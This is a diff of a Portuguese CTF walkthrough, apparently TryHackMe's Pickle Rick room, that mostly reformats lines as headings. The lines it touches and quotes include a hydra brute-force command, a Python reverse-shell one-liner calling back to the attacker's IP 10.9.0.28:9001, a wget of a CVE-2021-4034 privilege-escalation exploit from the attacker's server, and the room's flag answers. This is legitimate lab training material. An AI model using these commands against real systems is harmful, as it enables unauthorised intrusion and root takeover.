@@ -122,28 +122,28 @@ hydra -l R1ckRul3s -P /usr/share/seclists/Passwords/Common-Credentials/10-millio
 ```
 
 
-Depois de esperar um bom tempo de bruteforce, decidir entrar no robots.txt e esse conteúdo do robots.txt era  meio estranho
+## Depois de esperar um bom tempo de bruteforce, decidir entrar no robots.txt e esse conteúdo do robots.txt era  meio estranho
 
 ```
 Wubbalubbadubdub
 ```
 
-Tentando logar com o usuário
+## Tentando logar com o usuário
 R1ckRul3s e senha Wubbalubbadubdub. Consigo logar no sistema.
 ![vuln2.jpg](img/logado.png)
 
-Tentando um ls -la no command panel achamos o primeiro ingrediente
+## Tentando um ls -la no command panel achamos o primeiro ingrediente
 
 ![vuln2.jpg](img/primeiro_ingrediente.png)
 
-Respota aqui 
+## Resposta aqui 
 ![vuln2.jpg](img/resposta.png)
 
 ```
 mr. meeseek hair
 ```
 
-Precisamos pegar uma shell melhorada para avançar para os próximos ingredientes, então executei o comando
+## Precisamos pegar uma shell melhorada para avançar para os próximos ingredientes, então executei o comando
 
 
 ![vuln2.jpg](img/pegar_shell.png)
@@ -152,37 +152,40 @@ Precisamos pegar uma shell melhorada para avançar para os próximos ingrediente
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.28",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-Shell
+## Shell
+
 ![vuln2.jpg](img/shell.png)
 
 
 
 
-Trocando de diretorios encontramos o segundo ingrediente
+## Trocando de diretorios encontramos o segundo ingrediente
+
 ![vuln2.jpg](img/segundo_ingrediente.png)
 ```
 1 jerry tear
 ```
 
-Subindo shell para escalar privilegio
+## Subindo shell para escalar privilegio
+
 ![vuln2.jpg](img/subindo_exploit_privilege_escalation.png)
 
-Computador do atacante
+## Computador do atacante
 ```
 python -m http.server
 ```
 
-Computador do alvo
+## Computador do alvo
 ```
 wget http://10.9.0.28:8000/CVE-202104034.PY
 ```
 
-E agora, só rodar o exploit e escalar privilegio
+## E agora, só rodar o exploit e escalar privilegio
 
 
 ![vuln2.jpg](img/root.png)
 
-Com acesso root e procurando o terceiro ingrediente achamos na pasta do root
+## Com acesso root e procurando o terceiro ingrediente achamos na pasta do root
 
 ![vuln2.jpg](img/terceiro.png)
 
